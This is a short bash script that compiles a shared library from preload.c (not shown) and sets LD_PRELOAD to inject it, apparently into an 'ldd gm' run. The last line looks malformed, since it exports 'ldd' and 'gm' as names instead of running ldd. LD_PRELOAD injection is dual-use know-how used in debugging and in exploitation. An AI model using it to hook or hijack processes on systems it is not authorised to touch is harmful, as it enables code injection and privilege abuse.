#!/bin/bash
gcc -shared -fPIC preload.c -o preload.so -ldl
export LD_PRELOAD=$PWD/preload.so ldd gm
